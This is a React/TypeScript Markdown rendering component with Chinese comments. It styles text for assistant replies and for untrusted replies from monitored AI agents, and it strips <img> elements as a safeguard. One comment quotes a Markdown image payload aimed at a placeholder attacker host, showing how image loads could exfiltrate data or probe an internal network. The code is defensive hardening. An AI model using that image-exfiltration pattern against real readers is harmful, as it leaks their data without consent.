import type { ComponentProps } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'

/**
 * 通用 Markdown 渲染 —— 字号**继承父容器**(用 em 相对单位),由调用方用外层 text-[..] 控制大小。
 * 适配不同场景:助手回复(大)/ 事件详情对话(小)共用一套排版,不再各写一份。
 */
const components: ComponentProps<typeof ReactMarkdown>['components'] = {
  p: ({ children }) => <p className="leading-relaxed [&:not(:first-child)]:mt-2">{children}</p>,
  h1: ({ children }) => <h1 className="mt-2 text-[1.25em] font-semibold first:mt-0">{children}</h1>,
  h2: ({ children }) => <h2 className="mt-2 text-[1.15em] font-semibold first:mt-0">{children}</h2>,
  h3: ({ children }) => <h3 className="mt-2 text-[1.05em] font-semibold first:mt-0">{children}</h3>,
  strong: ({ children }) => <strong className="font-semibold text-ink">{children}</strong>,
  em: ({ children }) => <em className="italic">{children}</em>,
  ul: ({ children }) => (
    <ul className="mt-1.5 list-disc space-y-1 pl-5 marker:text-ink-mute">{children}</ul>
  ),
  ol: ({ children }) => (
    <ol className="mt-1.5 list-decimal space-y-1 pl-5 marker:text-ink-mute">{children}</ol>
  ),
  li: ({ children }) => <li className="pl-0.5">{children}</li>,
  a: ({ children, href }) => (
    <a href={href} target="_blank" rel="noreferrer" className="text-accent hover:underline">
      {children}
    </a>
  ),
  blockquote: ({ children }) => (
    <blockquote className="mt-1.5 border-l-2 border-line-2 pl-3 text-ink-3">{children}</blockquote>
  ),
  code: ({ className, children }) => {
    const block = /language-/.test(className ?? '')
    if (block) {
      return <code className="font-mono text-[0.92em] leading-relaxed">{children}</code>
    }
    return (
      <code className="rounded bg-surface-2 px-1.5 py-0.5 font-mono text-[0.9em]">{children}</code>
    )
  },
  pre: ({ children }) => (
    <pre className="mt-1.5 overflow-x-auto rounded-lg border border-line bg-subtle p-2.5">
      {children}
    </pre>
  ),
  table: ({ children }) => (
    <div className="mt-1.5 overflow-x-auto rounded-lg border border-line">
      <table className="w-full border-collapse text-[0.95em]">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-subtle">{children}</thead>,
  th: ({ children }) => (
    <th className="border-b border-line px-3 py-1.5 text-left font-medium">{children}</th>
  ),
  td: ({ children }) => <td className="border-b border-line px-3 py-1.5 align-top">{children}</td>,
  tr: ({ children }) => <tr className="last:[&>td]:border-0">{children}</tr>,
  hr: () => <hr className="my-2 border-line" />,
}

export function Markdown({ children }: { children: string }) {
  // 也用于渲染被监控智能体回复(不可信内容)。react-markdown 默认已丢弃裸 HTML(无 rehype-raw),
  // 此处再禁掉 <img>:否则 ![](http://attacker/x?d=…) 会在分析师浏览器自动外带数据 / 探内网。
  // unwrapDisallowed 保留其 alt 文本,不影响正常阅读。
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={components}
      disallowedElements={['img']}
      unwrapDisallowed
    >
      {children}
    </ReactMarkdown>
  )
}
